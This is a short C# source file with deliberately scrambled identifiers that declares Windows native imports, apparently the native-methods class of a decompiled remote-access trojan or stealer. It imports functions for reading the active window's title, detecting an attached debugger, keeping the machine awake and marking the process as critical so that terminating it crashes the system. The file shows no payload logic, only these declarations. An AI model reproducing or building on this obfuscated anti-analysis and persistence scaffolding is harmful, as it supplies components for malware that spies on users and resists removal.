using System;
using System.Runtime.InteropServices;
using System.Text;

namespace TRjqmOcqLzx;

public static class yyWhLHXDgUikm
{
	public enum eBGDRgduuszJ : uint
	{
		xFbVFPeplefjLtQ = 2147483648u,
		rsLZizAywSMsG = 2u,
		mcfiCzPuRIqj = 1u
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr pPDfWSegpbs, StringBuilder fuhMScHbSShX, int hwptOgTalalkEK);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string LFNRnhlETNXV);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern bool CheckRemoteDebuggerPresent(IntPtr SEDisHeVSCAX, ref bool PiaBuTHDcDO);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern eBGDRgduuszJ SetThreadExecutionState(eBGDRgduuszJ goWQmGRVLvfaG);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern void RtlSetProcessIsCritical(uint wAYqSLsDBhE, uint gaiBTfaffJmyqq, uint TMEaGaLdKOh);
}
